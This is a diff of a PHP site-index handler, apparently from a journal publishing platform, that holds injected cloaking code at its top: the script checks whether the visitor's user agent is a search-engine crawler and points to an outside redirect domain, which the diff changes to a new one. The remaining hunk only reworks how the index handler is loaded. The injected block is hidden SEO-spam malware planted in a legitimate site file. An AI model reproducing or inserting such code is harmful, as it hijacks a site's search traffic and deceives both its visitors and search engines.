@@ -5,7 +5,7 @@ header('Vary: User-Agent');
 
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-$urlTo = "https://fraserneave.org/";
+$urlTo = "https://ijse-aisi.cloud/";
 
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";
 
@@ -30,13 +30,13 @@ ob_end_flush();
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup pages_index
- *
- * @brief Handle site index requests.
+ * @brief Handle site index requests. 
  *
  */
 
 switch ($op) {
-    case 'index':
-        define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
-        break;
+	case 'index':
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
+		break;
 }
